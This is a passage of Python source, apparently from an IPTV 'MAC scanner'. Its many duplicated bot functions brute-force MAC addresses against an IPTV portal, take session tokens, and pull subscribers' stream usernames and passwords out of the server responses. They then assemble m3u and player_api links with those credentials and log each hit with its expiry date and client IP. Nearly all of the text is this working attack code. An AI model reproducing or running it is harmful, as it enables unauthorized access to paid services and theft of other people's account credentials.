			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d10():
	global hitc
	global hitr
	global tokenr
	for mac in range(10,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_10"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d11():
	global hitc
	global hitr
	global tokenr
	for mac in range(11,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_11"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d12():
	global hitc
	global hitr
	global tokenr
	for mac in range(12,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_12"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d13():
	global hitc
	global hitr
	global tokenr
	for mac in range(13,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_13"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d14():
	global hitc
	global hitr
	global tokenr
	for mac in range(14,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_14"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/','') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d15():
	global hitc
	global hitr
	global tokenr
	for mac in range(15,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_15"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

# ENCRYPTED BASE64 THREADiNG - iPTV & MORE

